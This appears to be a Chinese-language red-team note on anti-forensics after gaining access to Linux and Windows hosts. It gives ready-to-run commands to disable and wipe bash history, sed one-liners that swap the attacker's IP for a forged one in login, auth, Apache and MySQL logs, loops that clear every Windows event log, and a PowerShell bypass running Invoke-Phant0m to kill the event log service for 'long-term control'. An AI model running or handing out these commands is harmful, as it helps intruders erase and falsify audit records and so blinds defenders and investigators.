---
title: 日志处理
---
# Linux日志处理

## Bash日志处理

**bash去掉history记录，让系统不记录history**

```bash
export HISTSIZE=0
export HISTFILE=/dev/null
```

history命令的清除，也是对~/.bash_history进行定向清除

```bash
rm -rf ~/.bash_history
history -c
```

## 系统日志

直接将日志清除过于明显，一般使用sed进行定向清除或伪造

| 日志文件           | 说明                                                         |
| :----------------- | :----------------------------------------------------------- |
| `/var/log/btmp`    | 记录**错误登录（登陆失败）**日志；使用**lastb**命令查看      |
| `/var/log/lastlog` | 记录系统中所有用户最后一次成功登录时间，使用**lastlog**命令查看 |
| `/var/log/wtmp`    | 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用**last**命令来查看 |
| `/var/log/utmp`    | 只记录**当前登录用户**的信息；使用**w,who,users**等命令来查询 |
| `/var/log/secure`  | 记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码（Centos） |

```bash
#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP，-i直接编辑文件，必须在后边
sed 's/192.168.1.3/8.8.8.8/g' -i /var/log/btmp*
sed 's/192.168.1.3/8.8.8.8/g' -i /var/log/lastlog
sed 's/192.168.1.3/8.8.8.8/g' -i /var/log/wtmp

sed 's/192.168.1.3/8.8.8.8/g' -i secure
sed 's/192.168.1.3/8.8.8.8/g' -i /var/log/utmp
```

## Web日志处理

如apache的access.log,error.log。

```bash
sed ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/access.log
sed ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/error_log
#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP
```

## MySQL日志文件

```bash
log-error=/var/log/mysql/mysql_error.log		#错误日志
log-slow-queries=/var/log/mysql/mysql_slow.log	#慢查询日志
```

```bash
sed 's/192.168.1.3/8.8.8.8/g' –i /var/log/mysql/mysql_error.log
sed 's/192.168.1.3/8.8.8.8/g' –i /var/log/mysql/mysql_slow.log
```

## php日志处理

```bash
sed 's/192.168.1.3/192.168.1.4/g' –i /var/log/apache/php_error.log 
```

# Windows日志处理

**对于Windows事件日志分析，不同的EVENT ID代表了不同的意义**

| 事件ID | 说明                                             |
| :----- | :----------------------------------------------- |
| 4648   | 登录成功，会记录登录来源IP                       |
| 4625   | 登录失败，会记录登录来源IP                       |
| 4672   | 使用超级用户（如管理员）进行特殊登录，不会记录IP |
| 4720   | 创建用户                                         |
| 4733   | 从用户组删除用户                                 |
| 4779   | 注销事件，会记录登录来源IP                       |

## 一、wevtutil+for循环清除所有日志

```cmd
for /F "tokens=*" %a in ('wevtutil.exe el') DO wevtutil.exe cl "%a"
```

## 二、 ps批量删日志 

```cmd
PS C:\> wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}
```

## 三、运行ps脚本

```bash
powershell –exec bypass –Command "& {Import-Module 'C:\Invoke-Phant0m.ps1';Invoke-Phant0m}"
#win日志服务此时就会停止工作了
#长期控制，记得验证
```

> 不过这种方法太过暴力，而且停止日志记录这个方法停止后无法恢复
>
> 稳妥点还是手动删除登录事件